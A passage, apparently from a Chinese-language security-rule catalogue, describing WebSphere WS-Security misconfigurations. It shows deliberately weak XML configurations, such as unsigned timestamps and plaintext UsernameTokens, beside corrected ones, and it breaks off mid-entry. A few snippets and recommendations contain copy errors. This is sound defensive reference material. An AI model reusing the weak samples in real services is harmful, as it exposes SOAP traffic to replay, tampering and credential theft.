<h4 id="WebSphere-Service-Provider-Misconfiguration-Unsigned-Inbound-Timestamp"><a href="#WebSphere-Service-Provider-Misconfiguration-Unsigned-Inbound-Timestamp" class="headerlink" title="WebSphere Service Provider Misconfiguration: Unsigned Inbound Timestamp"></a>WebSphere Service Provider Misconfiguration: Unsigned Inbound Timestamp</h4><h5 id="ABSTRACT-226"><a href="#ABSTRACT-226" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未经签名的时间戳会导致 SOAP 消息遭受 tampering 及 replay 攻击。</p>
<h5 id="EXPLANATION-227"><a href="#EXPLANATION-227" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列服务提供程序配置可让 WebSphere 接受输入的未经签名的时间戳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; &lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestConsumerServiceConfig xmi:id=&quot;SecurityRequestConsumerServiceConfig_1211399165585&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212094497592&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-226"><a href="#RECOMMENDATIONS-226" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输入的时间戳验证签名。</p>
<p>下列服务提供程序配置可让 Axis 2 验证输入请求的签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1152150731239&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestConsumerServiceConfig xmi:id=&quot;SecurityRequestConsumerServiceConfig_1211399165585&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredIntegrity xmi:id=&quot;RequiredIntegrity_1212094350854&quot; name=&quot;int&quot; usage=&quot;Required&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212094497592&quot;/&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/requiredIntegrity&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-225"><a href="#REFERENCES-225" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Unsigned-Outbound-Timestamp"><a href="#WebSphere-Service-Provider-Misconfiguration-Unsigned-Outbound-Timestamp" class="headerlink" title="WebSphere Service Provider Misconfiguration: Unsigned Outbound Timestamp"></a>WebSphere Service Provider Misconfiguration: Unsigned Outbound Timestamp</h4><h5 id="ABSTRACT-227"><a href="#ABSTRACT-227" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未经签名的时间戳会导致 SOAP 消息遭受 tampering 及 replay 攻击。</p>
<h5 id="EXPLANATION-228"><a href="#EXPLANATION-228" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列服务提供程序配置可让 WebSphere 发送未经签名的时间戳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; &lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseGeneratorServiceConfig xmi:id=&quot;SecurityResponseGeneratorServiceConfig_1211568020342&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;addTimestamp xmi:id=&quot;AddTimestamp_1211568020342&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-227"><a href="#RECOMMENDATIONS-227" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输入的时间戳验证签名。</p>
<p>下列服务提供程序配置可让 WebSphere 对输出的消息进行签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; &lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseGeneratorServiceConfig xmi:id=&quot;SecurityResponseGeneratorServiceConfig_1211568020342&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredIntegrity xmi:id=&quot;RequiredIntegrity_1212094350854&quot; name=&quot;int&quot; usage=&quot;Required&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212094497592&quot;/&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/requiredIntegrity&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-226"><a href="#REFERENCES-226" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Weak-Token"><a href="#WebSphere-Service-Provider-Misconfiguration-Weak-Token" class="headerlink" title="WebSphere Service Provider Misconfiguration: Weak Token"></a>WebSphere Service Provider Misconfiguration: Weak Token</h4><h5 id="ABSTRACT-228"><a href="#ABSTRACT-228" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若在未经加密的通道上使用 UsernameToken 及明文密码，则可截取 SOAP 消息的攻击者会趁机获取该密码。</p>
<h5 id="EXPLANATION-229"><a href="#EXPLANATION-229" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 UsernameToken 的服务提供程序可能会接受以明文形式发送的密码。若通过未经加密的通道发送明文密码，则可截取 SOAP 消息的攻击者会趁机获取凭证。</p>
<p>下列 WebSphere 服务提供程序配置使用了此 UsernameToken：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1152150731239&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestConsumerServiceConfig xmi:id=&quot;SecurityRequestConsumerServiceConfig_1211399165585&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredSecurityToken xmi:id=&quot;RequiredSecurityToken_1211399165605&quot; name=&quot;Token_34865684&quot; uri=&quot;&quot; localName=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#UsernameToken&quot; usage=&quot;Required&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-228"><a href="#RECOMMENDATIONS-228" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>要求使用签名，而不是 UsernameToken。下面提供了一个配置示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1152150731239&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestConsumerServiceConfig xmi:id=&quot;SecurityRequestConsumerServiceConfig_1211399165585&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredSecurityToken xmi:id=&quot;RequiredSecurityToken_1213868096039&quot; name=&quot;unt&quot; uri=&quot;&quot; localName=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3&quot; usage=&quot;Required&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-227"><a href="#REFERENCES-227" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[2] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[4] Standards Mapping - FIPS200 MP</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.8, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Inbound-WS-Security-Not-Enabled"><a href="#WebSphere-Service-Requester-Misconfiguration-Inbound-WS-Security-Not-Enabled" class="headerlink" title="WebSphere Service Requester Misconfiguration: Inbound WS-Security Not Enabled"></a>WebSphere Service Requester Misconfiguration: Inbound WS-Security Not Enabled</h4><h5 id="ABSTRACT-229"><a href="#ABSTRACT-229" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若请求不使用 WS-Security，则难以保证消息的完整性或保密性。</p>
<h5 id="EXPLANATION-230"><a href="#EXPLANATION-230" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>WS-Security 是 SOAP 的增强功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，并将安全性内置到消息中。</p>
<p>若 IBM WebSphere WS-Security 客户端部署描述符扩展文件中缺少 <code>&lt;securityResponseConsumerServiceConfig&gt;</code> 标签，则表明未启用输出消息的安全性。</p>
<h5 id="RECOMMENDATIONS-229"><a href="#RECOMMENDATIONS-229" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则将客户端配置为使用 WS-Security。该配置应包含 <code>&lt;securityResponseConsumerServiceConfig&gt;</code> 标签以及适当的安全令牌、时间戳、签名和加密标签。</p>
<h5 id="REFERENCES-228"><a href="#REFERENCES-228" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Web Services Security SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Encryption"><a href="#WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Encryption" class="headerlink" title="WebSphere Service Requester Misconfiguration: Missing Inbound Encryption"></a>WebSphere Service Requester Misconfiguration: Missing Inbound Encryption</h4><h5 id="ABSTRACT-230"><a href="#ABSTRACT-230" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未加密的消息无法保护其保密性。</p>
<h5 id="EXPLANATION-231"><a href="#EXPLANATION-231" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SOAP 消息级加密可确保真正的端到端保密性。可通过多种传输协议发送 SOAP 消息，例如 HTTPS、HTTP、TCP、SMTP、UDP 等。无论采用哪种传输协议，消息级加密都可确保消息的保密性。Web 服务之间的常见传送情形是在各种服务之间转发 SOAP 消息，因此通过消息级加密，消息发送者和接收者均无需担忧中继点之间的传输安全问题。</p>
<h5 id="RECOMMENDATIONS-230"><a href="#RECOMMENDATIONS-230" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则将客户端配置为接受输入的消息并对其进行解密。通过启用“响应用户服务”配置中的保密性，便可完成此配置。</p>
<p>下面提供了 WebSphere 配置示例，将对输入的消息进行加密：</p>
